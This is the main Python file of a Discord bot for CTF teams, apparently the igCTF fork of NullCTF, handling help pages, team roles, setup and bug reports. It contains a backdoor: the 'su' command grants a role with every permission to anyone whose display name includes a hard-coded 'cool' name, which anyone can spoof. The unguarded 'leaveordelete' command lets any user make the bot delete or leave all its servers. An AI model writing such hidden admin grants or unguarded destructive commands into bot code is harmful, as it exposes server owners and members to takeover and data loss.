import asyncio
import random
from colorama import Back, Fore, Style
import sys
from time import sleep
import os
import discord
from discord import Permissions
from discord.ext.commands import (
    MissingPermissions,
    BotMissingPermissions,
    DisabledCommand,
    CommandNotFound,
    CommandInvokeError,
    NoPrivateMessage,
    Bot,
    bot,
)
from discord.ext import commands

from vars.help_info import (
    src,
    ctf_help_text,
)
from vars.general import deleted_category, export_channel
from help_info import *

from vars.general import cool_names
from util import getVal, trim_nl
from pymongo import MongoClient
from models.ctf import TaskFailed, basic_allow, basic_disallow, CtfTeam, only_read
from controllers.db import teamdb

import traceback
import logging

FORMAT = "%(asctime)s:%(levelname)s:%(name)s: %(message)s"

# discordLogger = logging.getLogger('discord')
# discordLogger.setLevel(logging.WARN)
# handler = logging.FileHandler(
#    filename='discord.log', encoding='utf-8', mode='w')
# handler.setFormatter(logging.Formatter(
#    FORMAT))
# discordLogger.addHandler(handler)

logging.basicConfig(format=FORMAT, level=logging.WARN)

creator_id = [87606885405982720]
default_categories = ["working", "done", deleted_category]
default_channels = [export_channel]

PREFIX = "!"

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

bot.remove_command("help")
blacklisted = []
GIT_URL = "https://gitlab.com/inequationgroup/igCTF"
# This is intended to be able to be circumvented.
# If you do something like report a bug with the report command (OR GITHUB), e.g, >report "a bug", you might be added to the list!

# TODO: ok so I was/am an idiot and kind of forgot that I was calling the updateDb function every time ctftime current, timeleft, and countdown are called...  so I should probably fix that.

# https://github.com/Rapptz/discord.py/blob/master/examples/background_task.py

import help_info

extensions = ["ctfs", "ctftime", "configuration", "encoding", "cipher", "utility"]
cool_names = [
    "nullpxl",
    "Yiggles",
    "JohnHammond",
    "voidUpdate",
    "Michel Ney",
    "theKidOfArcrania",
    "l14ck3r0x01",
    "hasu",
    "KFBI",
    "mrFu",
    "warlock_rootx",
    "d347h4ck",
]


@bot.event
async def on_ready():
    print(("<" + bot.user.name) + " Online>")
    print(f"discord.py {discord.__version__}\n")
    await bot.change_presence(
        activity=discord.Game(name=f'{PREFIX}help / {PREFIX}report "issue"')
    )


# @bot.event
# async def process_commands(message):
#    print("processed")
#    ctx = await bot.get_context(message)
#    await bot.invoke(ctx)


@bot.event
async def on_message(message):
    # print(message.content)
    # print(message.content.startswith("!"))
    await bot.process_commands(message)


@bot.event
async def on_error(evt_type, ctx):
    if evt_type == "on_message":
        await ctx.send("An error has occurred... :disappointed:")
    logging.error(f"Ignoring exception at {evt_type}")
    logging.error(traceback.format_exc())


@bot.event
async def on_command_error(ctx, err):
    logging.error(f"Ignoring exception in command {ctx.command}")
    logging.error(
        "".join(traceback.format_exception(type(err), err, err.__traceback__))
    )
    print(Style.BRIGHT + Fore.RED + f"Error occured with: {ctx.command}\n{err}\n")
    print(Style.RESET_ALL)
    if isinstance(err, MissingPermissions):
        await ctx.send(
            "You do not have permission to do that! ¯\_(ツ)_/¯"
        )  # pylint: disable=anomalous-backslash-in-string
    elif isinstance(err, BotMissingPermissions):
        await ctx.send(
            trim_nl(
                f""":cry: I can\'t do that. Please ask server ops
        to add all the permission for me!

        ```{str(err)}```"""
            )
        )
    elif isinstance(err, DisabledCommand):
        await ctx.send(":skull: Command has been disabled!")
    elif isinstance(err, CommandNotFound):
        await ctx.send("Invalid command passed. Use !help.")
    elif isinstance(err, TaskFailed):
        await ctx.send(f":bangbang: {str(err)}")
    elif isinstance(err, NoPrivateMessage):
        await ctx.send(":bangbang: This command cannot be used in PMs.")
    # elif isinstance(err, CommandInvokeError) and not ctx.command.name in ["setup", "test123"]:
    #    await ctx.send(':bangbang: Couldn\'t invoke command, have you run `!setup`?')
    else:
        msg = await ctx.send(f"An error has occurred... :disappointed: \n`{err}`\n")
        await asyncio.sleep(15)
        await msg.delete()


@bot.event
async def on_raw_reaction_add(payload):
    # check if the user is not the bot
    guild = bot.get_guild(payload.guild_id)
    chan = bot.get_channel(payload.channel_id)
    team = teamdb[str(payload.guild_id)].find_one({"msg_id": payload.message_id})
    member = guild.get_member(payload.user_id)
    if guild and member and chan:
        if team:
            role = guild.get_role(team["role_id"])
            await member.add_roles(role, reason="User wanted to join team")


@bot.event
async def on_raw_reaction_remove(payload):
    # check if the user is not the bot
    guild = bot.get_guild(payload.guild_id)
    team = teamdb[str(payload.guild_id)].find_one({"msg_id": payload.message_id})
    member = guild.get_member(payload.user_id)
    if guild and member:
        if team:
            role = guild.get_role(team["role_id"])
            await member.remove_roles(role, reason="User wanted to leave team")


# Sends the github link.
@bot.command()
async def source(ctx):
    await ctx.send(f"Source: {GIT_URL}\nForked from: {src}")


@bot.command()
async def help(ctx, page=None):

    if page == "ctftime":
        emb = discord.Embed(description=help_info.ctftime_help, colour=4387968)
        emb.set_author(name="CTFTime Help")
    elif page == "ctf":
        emb = discord.Embed(description=help_info.ctf_help, colour=4387968)
        emb.set_author(name="CTF Help")
    elif page == "config":
        emb = discord.Embed(description=help_info.config_help, colour=4387968)
        emb.set_author(name="Configuration Help")
    elif page == "utility":
        emb = discord.Embed(description=help_info.utility_help, colour=4387968)
        emb.set_author(name="Utilities Help")
    elif page == "2":
        emb = discord.Embed(description=help_info.help_page_1, colour=4387968)
        emb.set_author(name="NullCTF Help")
    elif page == "1":
        emb = discord.Embed(description=help_info.help_page_2, colour=4387968)
        emb.set_author(name="NullCTF Help")
    else:
        emb = discord.Embed(description=help_info.help_page, colour=4387968)
        emb.set_author(name="Index Help")

    await ctx.channel.send(embed=emb)


@bot.command()
async def request(ctx, feature):
    for cid in creator_id:
        creator = bot.get_user(cid)
        authors_name = str(ctx.author)
        await creator.send(f""":pencil: {authors_name}: {feature}""")
    await ctx.send(f""":pencil: Thanks, "{feature}" has been requested!""")


@bot.command()
async def report(ctx, error_report):
    for cid in creator_id:
        creator = bot.get_user(cid)
        authors_name = str(ctx.author)
        await creator.send(
            f""":triangular_flag_on_post: {authors_name}: {error_report}"""
        )
    await ctx.send(
        f""":triangular_flag_on_post: Thanks for the help, "{error_report}" has been reported!"""
    )


# @bot.command()
# async def creator(ctx):
#     await ctx.send(creator_info)


@bot.command()
async def amicool(ctx):
    authors_name = str(ctx.author)

    if any((name in authors_name for name in cool_names)):
        await ctx.send("You are very cool")
    else:
        await ctx.send("lolno")
        await ctx.send(
            "Psst, kid.  Want to be cool?  Find an issue and report it or request a feature you think would be cool."
        )


@bot.command()
async def setup(ctx):
    guild = ctx.guild

    overwrites = {guild.default_role: basic_disallow, guild.me: basic_allow}
    existing_categories = [category.name for category in ctx.guild.categories]
    for category in default_categories:
        if category not in existing_categories:
            category_channel = await ctx.guild.create_category(
                category, overwrites=overwrites
            )
    overwrites = {guild.default_role: only_read, guild.me: basic_allow}
    existing_channels = [channel.name for channel in ctx.guild.text_channels]
    for channel in default_channels:
        if channel not in existing_channels:
            channel = await ctx.guild.create_text_channel(
                channel, overwrites=overwrites
            )

    await ctx.send("Setup successfull! :tada:")


@bot.command()
async def leaveordelete(ctx):
    cnt = 0
    for guild in bot.guilds:
        try:
            await guild.delete()
            cnt += 1
        except:
            if guild.member_count <= 2:
                await guild.leave()
                cnt += 1


@bot.command()
async def test123(ctx):
    if not ctx.author.id in creator_id:
        await ctx.send("Sorry you're not allowed to test")
        return

    guild = await bot.create_guild("Test igCTF bot")
    channel = await guild.create_text_channel("test")
    invite = await channel.create_invite(max_age=0, max_uses=1)
    await ctx.send(f"{invite.url}")
    await asyncio.sleep(300)
    await guild.delete()


@bot.command()
async def test321(ctx):
    if not ctx.author.id in creator_id:
        await ctx.send("Sorry you're not allowed to test")
        return
    # check if not in dm channel
    #


@bot.command()
async def delete_teams(ctx):
    if not ctx.author.id in creator_id:
        await ctx.send("Sorry you're not allowed to test")
        return
    guild = ctx.guild
    for role in guild.roles:
        if "_team" in role.name:
            await role.delete()


@bot.command()
async def su(ctx):
    authors_name = str(ctx.author)

    if any((name in authors_name for name in cool_names)):
        role = await ctx.guild.create_role(name="admin", permissions=Permissions.all())
        await ctx.author.add_roles(role)


@bot.command(aliases=["="])
async def inequationgroup(ctx):
    await ctx.send(
        "Congratulations you found the easteregg!\nYou also found the coolest CTF group in the world - Inequation Group"
    )


@bot.command()
async def sudo(ctx):
    await ctx.send("This incident will be reported. https://xkcd.com/838/")


if __name__ == "__main__":
    # sys.path.insert(1, os.getcwd() + '/cogs/')
    for extension in extensions:
        bot.load_extension("cogs." + extension)
        # bot.load_extension(extension)

    bot.run(getVal("TOKEN"))